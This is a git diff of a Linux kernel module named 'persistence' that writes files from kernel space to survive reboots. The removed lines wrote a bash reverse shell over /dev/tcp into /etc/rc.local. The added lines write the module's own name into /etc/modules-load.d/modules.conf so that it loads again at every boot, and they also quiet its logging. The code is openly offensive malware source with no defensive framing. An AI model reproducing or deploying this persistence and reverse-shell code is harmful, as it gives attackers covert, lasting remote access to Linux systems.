@@ -4,6 +4,8 @@
  */
 
 #define pr_fmt(fmt) "%s: " fmt, __func__
+#define PATH "/etc/modules-load.d/modules.conf"
+#define NAME "persistence\n"
 
 #include <linux/kernel.h>
 #include <linux/module.h>
@@ -14,43 +16,56 @@
 #define dbg_print(fmt, ...) /* No-op */
 #endif
 
-static int rc_local(void)
+static int openrc(void)
 {
-	struct file *file;
-	char *data =
-		"#!/bin/bash\n/bin/bash -c 'sh -i >& /dev/tcp/127.0.0.1/5200 0>&1'\n";
-	loff_t pos = 0; // File offset
-	ssize_t written;
+    struct file *file;
+    char *data = NAME;
+    loff_t pos = 0; // File offset
+    ssize_t written;
 
-	// Create or Open the file
-	file = filp_open("/etc/rc.local", O_WRONLY | O_CREAT | O_TRUNC, 0644);
-	if (IS_ERR(file)) {
-		dbg_print("Failed to open file");
-		return -1;
-	}
+    // Create or Open the file
+    dbg_print("Open file");
+    file = filp_open(PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (IS_ERR(file))
+    {
+        dbg_print("Failed to open file");
+        return -1;
+    }
 
-	// Write data
-	written = kernel_write(file, data, strlen(data), &pos);
-	if (written < 0) {
-		dbg_print("Failed to write file");
-		filp_close(file, NULL);
-		return -1;
-	}
+    // Write data
+    dbg_print("Write file");
+    written = kernel_write(file, data, strlen(data), &pos);
+    if (written < 0)
+    {
+        dbg_print("Failed to write file");
+        filp_close(file, NULL);
+        return -1;
+    }
 
-	filp_close(file, NULL);
-	return 0;
+    filp_close(file, NULL);
+    return 0;
 }
 
 static int __init persistence_init(void)
 {
-	rc_local();
+    int ret;
+
 	dbg_print("persistence loaded\n");
+    ret = openrc();
+
+    if (ret == 0)
+        dbg_print("openrc persistence loaded");
+    else
+    {
+        dbg_print("openrc persistence failed");
+    }
+
 	return 0;
 }
 
 static void __exit persistence_exit(void)
 {
-	pr_info("persistence exit successfully\n");
+	dbg_print("persistence exit successfully\n");
 }
 
 module_init(persistence_init) module_exit(persistence_exit)
